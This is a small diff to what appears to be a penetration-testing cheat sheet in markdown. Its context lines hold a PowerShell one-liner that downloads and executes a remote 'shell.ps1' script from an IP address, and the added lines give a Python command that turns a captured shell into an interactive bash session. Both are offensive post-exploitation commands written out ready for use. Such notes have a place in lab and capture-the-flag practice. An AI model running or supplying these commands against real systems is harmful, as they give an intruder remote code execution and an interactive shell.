@@ -38,3 +38,7 @@ Example :
 ```shell
 powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.12.81:8000/shell.ps1')
 ```
+### How to spawn bash shell
+```shell
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
